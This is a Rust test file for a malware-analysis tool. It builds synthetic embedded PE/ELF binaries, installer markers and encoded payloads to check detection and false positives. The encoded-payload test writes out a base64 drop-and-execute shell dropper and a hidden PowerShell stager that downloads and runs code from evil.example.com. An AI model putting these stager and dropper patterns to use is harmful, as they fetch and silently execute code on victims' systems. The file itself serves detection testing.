//! Integration tests for embedded binary and SFX format detection.
//!
//! Tests call the library's `analyze_file` directly to exercise the full
//! analysis pipeline without subprocess overhead. YARA is disabled because
//! none of these tests depend on YARA matches.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::fs;
use tempfile::TempDir;

/// Analyze a file in-process and return the compact-format JSON output
/// equivalent to what `cleave --format json analyze <path>` would print.
///
/// Returns `(json_string, parsed_value)` so tests can substring-match or
/// structurally inspect the result.
fn analyze_compact(path: &std::path::Path) -> (String, serde_json::Value) {
    let options = cleave::AnalysisOptions {
        disable_yara: true,
        ..Default::default()
    };
    let mut report = cleave::analyze_file(path, &options).expect("analyze");
    report.shrink_to_fit();
    report.finalize();
    let compact = cleave::types::compact_from_files(&report.files);
    let json_string = serde_json::to_string(&compact).expect("serialize");
    let json_value: serde_json::Value =
        serde_json::from_str(&json_string).expect("parse roundtrip");
    (json_string, json_value)
}

// ── Fixture builders ───────────────────────────────────────────────────────────

fn write_minimal_pe_at(buf: &mut Vec<u8>, offset: usize, section_count: u16) {
    const E_LFANEW: usize = 0x80;
    const OPTIONAL_HEADER_SIZE: u16 = 0xE0;
    const FIRST_SECTION_RAW_PTR: u32 = 0x200;
    const FIRST_SECTION_RAW_SIZE: u32 = 0x200;
    const SIZE_OF_IMAGE: u32 = 0x1000;

    let pe = offset + E_LFANEW;
    let section_table = pe + 24 + OPTIONAL_HEADER_SIZE as usize;
    let min_len = offset + FIRST_SECTION_RAW_PTR as usize + FIRST_SECTION_RAW_SIZE as usize;
    if buf.len() < min_len {
        buf.resize(min_len, 0);
    }

    buf[offset] = 0x4D; // M
    buf[offset + 1] = 0x5A; // Z
    buf[offset + 0x3C..offset + 0x40].copy_from_slice(&(E_LFANEW as u32).to_le_bytes());

    buf[pe..pe + 4].copy_from_slice(b"PE\0\0");
    buf[pe + 4..pe + 6].copy_from_slice(&0x014Cu16.to_le_bytes()); // Machine: i386
    buf[pe + 6..pe + 8].copy_from_slice(&section_count.to_le_bytes());
    buf[pe + 20..pe + 22].copy_from_slice(&OPTIONAL_HEADER_SIZE.to_le_bytes());
    buf[pe + 24..pe + 26].copy_from_slice(&0x010Bu16.to_le_bytes()); // PE32 magic
    buf[pe + 24 + 56..pe + 24 + 60].copy_from_slice(&SIZE_OF_IMAGE.to_le_bytes());

    // Minimal .text section that satisfies embedded_binary_detector validation.
    let section = section_table;
    buf[section..section + 8].copy_from_slice(b".text\0\0\0");
    buf[section + 8..section + 12].copy_from_slice(&FIRST_SECTION_RAW_SIZE.to_le_bytes()); // VirtualSize
    buf[section + 12..section + 16].copy_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddress
    buf[section + 16..section + 20].copy_from_slice(&FIRST_SECTION_RAW_SIZE.to_le_bytes()); // SizeOfRawData
    buf[section + 20..section + 24].copy_from_slice(&FIRST_SECTION_RAW_PTR.to_le_bytes());
    // PointerToRawData
}

/// Minimal PE stub with a valid section table and raw section span.
fn minimal_pe_stub() -> Vec<u8> {
    let mut buf = Vec::new();
    write_minimal_pe_at(&mut buf, 0, 1);
    buf
}

/// Embed a valid PE32 header at `offset` within `buf`.
fn embed_pe_at(buf: &mut Vec<u8>, offset: usize) {
    write_minimal_pe_at(buf, offset, 2);
}

/// Embed a valid ELF64 LE header at `offset` within `buf`.
#[allow(dead_code)]
fn embed_elf_at(buf: &mut Vec<u8>, offset: usize) {
    while buf.len() < offset + 64 {
        buf.push(0u8);
    }
    buf[offset] = 0x7F;
    buf[offset + 1] = 0x45; // E
    buf[offset + 2] = 0x4C; // L
    buf[offset + 3] = 0x46; // F
    buf[offset + 4] = 2; // EI_CLASS: 64-bit
    buf[offset + 5] = 1; // EI_DATA: LE
    buf[offset + 6] = 1; // EI_VERSION: 1
    buf[offset + 16..offset + 18].copy_from_slice(&2u16.to_le_bytes()); // ET_EXEC
    buf[offset + 18..offset + 20].copy_from_slice(&0x3Eu16.to_le_bytes()); // EM_X86_64
}

// ── SFX marker detection ──────────────────────────────────────────────────────
//
// Grouped into a single test so the shared CapabilityMapper init pays its
// ~1s cost once instead of three times across separate nextest processes.

#[test]
fn sfx_marker_detection() {
    let tmp = TempDir::new().unwrap();

    // NSIS deadbeef marker + secondary string.
    let mut nsis = minimal_pe_stub();
    nsis.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]);
    nsis.extend_from_slice(b"NSIS Error");
    nsis.extend_from_slice(&[0u8; 60]);
    let nsis_path = tmp.path().join("nsis.exe");
    fs::write(&nsis_path, &nsis).unwrap();
    let (stdout, _) = analyze_compact(&nsis_path);
    assert!(
        stdout.contains("file/sfx/nsis"),
        "Expected 'file/sfx/nsis' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );

    // Inno Setup marker.
    let mut inno = minimal_pe_stub();
    inno.extend_from_slice(b"Inno Setup Setup Data");
    inno.extend_from_slice(&[0u8; 60]);
    let inno_path = tmp.path().join("inno.exe");
    fs::write(&inno_path, &inno).unwrap();
    let (stdout, _) = analyze_compact(&inno_path);
    assert!(
        stdout.contains("file/sfx/inno-setup"),
        "Expected 'file/sfx/inno-setup' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );

    // CAB (MSCF) overlay appended after a real PE.
    if let Ok(mut host) = fs::read("tests/fixtures/test.exe") {
        host.extend_from_slice(&[0x4D, 0x53, 0x43, 0x46]);
        host.extend_from_slice(&[0u8; 20]);
        let cab_path = tmp.path().join("sfx.exe");
        fs::write(&cab_path, &host).unwrap();
        let (stdout, _) = analyze_compact(&cab_path);
        assert!(
            stdout.contains("self-extracting/cab"),
            "Expected 'self-extracting/cab' in output.\nFirst 2000 chars:\n{}",
            &stdout[..stdout.len().min(2000)]
        );
    } else {
        eprintln!("skipping CAB sub-assertion: missing tests/fixtures/test.exe");
    }
}

// ── Embedded PE / ELF scanning ────────────────────────────────────────────────
//
// Four related sub-cases bundled into one #[test] to share mapper init:
//   1. PE-in-PE dropper detection + host metrics
//   2. PE-in-NSIS-overlay downgrade to notable
//   3. ELF-in-ELF detection + host metrics
//   4. Child ELF carves and extracts its own strings

#[test]
fn embedded_binary_scanning() {
    let tmp = TempDir::new().unwrap();

    // 1. Embedded PE in PE.
    let mut pe_host = minimal_pe_stub();
    embed_pe_at(&mut pe_host, 512);
    let pe_path = tmp.path().join("dropper.exe");
    fs::write(&pe_path, &pe_host).unwrap();
    let (stdout, report) = analyze_compact(&pe_path);
    assert!(
        stdout.contains("binary/embedded/pe"),
        "Expected 'binary/embedded/pe' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
    let pe_metrics = report["fs"]
        .as_array()
        .and_then(|files| files.first())
        .and_then(|host| host["ms"].as_object())
        .expect("host PE should expose binary metrics in compact report");
    assert_eq!(
        pe_metrics["binary.embedded_binary_count"].as_f64(),
        Some(1.0)
    );
    assert_eq!(
        pe_metrics["binary.embedded_file_count"].as_f64(),
        Some(1.0)
    );

    // 2. Embedded PE in NSIS overlay should downgrade to notable (level 3).
    let mut nsis = minimal_pe_stub();
    nsis.resize(0x600, 0);
    nsis.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]);
    nsis.extend_from_slice(b"NSIS Error");
    embed_pe_at(&mut nsis, 0x800);
    let nsis_path = tmp.path().join("nsis_payload.exe");
    fs::write(&nsis_path, &nsis).unwrap();
    let (stdout, report) = analyze_compact(&nsis_path);
    let findings = report["fs"][0]["ts"]
        .as_array()
        .expect("top-level findings should be an array");
    let embedded_pe: Vec<_> = findings
        .iter()
        .filter(|f| f["i"] == "binary/embedded/pe")
        .collect();
    assert!(
        !embedded_pe.is_empty(),
        "expected host-level embedded PE finding"
    );
    assert!(
        embedded_pe.iter().all(|f| f["l"] == 3),
        "expected NSIS overlay embedded PE findings to be downgraded to notable.\nstdout:\n{stdout}",
    );

    // 3. & 4. Real ELF with another ELF appended.
    let Ok(elf_host) = fs::read("tests/fixtures/test.elf") else {
        eprintln!("skipping ELF sub-cases: missing tests/fixtures/test.elf");
        return;
    };
    let mut combo = elf_host.clone();
    let embed_at = combo.len() + 16;
    combo.resize(embed_at, 0u8);
    combo.extend_from_slice(&elf_host);
    let combo_path = tmp.path().join("elf_dropper.elf");
    fs::write(&combo_path, &combo).unwrap();
    let (stdout, report) = analyze_compact(&combo_path);
    assert!(
        stdout.contains("binary/embedded/elf"),
        "Expected 'binary/embedded/elf' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
    let elf_metrics = report["fs"]
        .as_array()
        .and_then(|files| files.first())
        .and_then(|host| host["ms"].as_object())
        .expect("host ELF should expose binary metrics in compact report");
    assert_eq!(
        elf_metrics["binary.embedded_binary_count"].as_f64(),
        Some(1.0)
    );
    assert_eq!(
        elf_metrics["binary.embedded_file_count"].as_f64(),
        Some(1.0)
    );
    assert!(!elf_metrics.contains_key("binary.embedded_archive_count"));

    // 4. Child ELF extracts its own strings.
    let files = report["fs"]
        .as_array()
        .expect("report should contain file entries");
    let child = files
        .iter()
        .find(|file| {
            file["path"]
                .as_str()
                .is_some_and(|path| path.contains("!!embedded:elf@"))
        })
        .expect("embedded ELF should be analyzed as a child file");
    let strings = child["ss"]
        .as_array()
        .expect("embedded ELF child should include extracted strings");
    assert!(
        strings.iter().any(|entry| {
            entry
                .as_array()
                .and_then(|fields| fields.get(1))
                .and_then(|value| value.as_str())
                == Some("execve")
        }),
        "expected child ELF strings to be extracted from the carved bytes.\nchild:\n{}",
        serde_json::to_string_pretty(child).unwrap()
    );
}

#[test]
fn test_known_good_upx_exe_has_no_embedded_elf_or_hostile_findings() {
    let sample = std::path::Path::new("/srv/data/known-good/data2/upx.exe");
    if !sample.exists() {
        return;
    }

    let (stdout, _report) = analyze_compact(sample);

    assert!(
        !stdout.contains("\"id\":\"binary/embedded/elf\""),
        "False positive: embedded ELF findings on known-good UPX utility.\nFirst 4000 chars:\n{}",
        &stdout[..stdout.len().min(4000)]
    );
    assert!(
        !stdout.contains("\"crit\":\"hostile\""),
        "False positive: hostile findings on known-good UPX utility.\nFirst 4000 chars:\n{}",
        &stdout[..stdout.len().min(4000)]
    );
}

// ── Base64-encoded payloads (shell + PowerShell) ──────────────────────────────

#[test]
fn encoded_payload_detection() {
    use base64::Engine;

    let tmp = TempDir::new().unwrap();

    // Shell script wrapping a base64-encoded gzipped payload.
    let mut payload = vec![0x1Fu8, 0x8B, 0x08, 0x00]; // gzip magic + CM + FLG
    payload.resize(192, 0u8);
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    let sh = format!(
        "#!/bin/sh\n# dropper\np=\"{}\"\necho \"$p\" | base64 -d | gunzip > /tmp/.x && chmod +x /tmp/.x && /tmp/.x\n",
        encoded
    );
    let sh_path = tmp.path().join("dropper.sh");
    fs::write(&sh_path, &sh).unwrap();
    let (stdout, _) = analyze_compact(&sh_path);
    assert!(
        stdout.contains("base64-gz"),
        "Expected 'base64-gz' in output.\nFirst 3000 chars:\n{}",
        &stdout[..stdout.len().min(3000)]
    );

    // PowerShell -EncodedCommand UTF-16LE+base64 stager.
    let ps_code =
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
    let ps = format!(
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}\n",
        b64
    );
    let ps_path = tmp.path().join("stager.ps1");
    fs::write(&ps_path, &ps).unwrap();
    let (stdout, _) = analyze_compact(&ps_path);
    assert!(
        stdout.contains("base64-powershell"),
        "Expected 'base64-powershell' in output.\nFirst 3000 chars:\n{}",
        &stdout[..stdout.len().min(3000)]
    );
}

// ── False-positive regression suite ───────────────────────────────────────────
//
// Clean fixtures must NOT fire embedded-binary or base64-binary findings.
// All sub-cases bundled to share mapper init.

#[test]
fn false_positive_regressions() {
    let tmp = TempDir::new().unwrap();

    // Clean PE: no embedded PE finding.
    if let Ok(()) = fs::copy("tests/fixtures/test.exe", tmp.path().join("clean.exe")).map(|_| ()) {
        let (stdout, _) = analyze_compact(&tmp.path().join("clean.exe"));
        let count = stdout.matches("binary/embedded/pe").count();
        assert!(
            count == 0,
            "False positive: {count} 'binary/embedded/pe' findings on clean test.exe"
        );
    } else {
        eprintln!("skipping clean-PE sub-case: missing tests/fixtures/test.exe");
    }

    // Clean ELF: no embedded ELF finding.
    if let Ok(()) = fs::copy("tests/fixtures/test.elf", tmp.path().join("clean.elf")).map(|_| ()) {
        let (stdout, _) = analyze_compact(&tmp.path().join("clean.elf"));
        let count = stdout.matches("binary/embedded/elf").count();
        assert!(
            count == 0,
            "False positive: {count} 'binary/embedded/elf' findings on clean test.elf"
        );
    } else {
        eprintln!("skipping clean-ELF sub-case: missing tests/fixtures/test.elf");
    }

    // Benign deploy script with short base64: no base64-binary finding.
    let benign = r#"#!/bin/bash
# Deploy script
echo "Starting deployment..."
CONFIG=$(echo "dGVzdA==" | base64 -d)
echo "Config: $CONFIG"
curl -s https://api.example.com/deploy
echo "Done"
"#;
    let benign_path = tmp.path().join("deploy.sh");
    fs::write(&benign_path, benign).unwrap();
    let (stdout, _) = analyze_compact(&benign_path);
    assert!(
        !stdout.contains("base64-gz")
            && !stdout.contains("base64-pe")
            && !stdout.contains("base64-elf"),
        "False positive: base64-binary finding on benign deploy script.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}
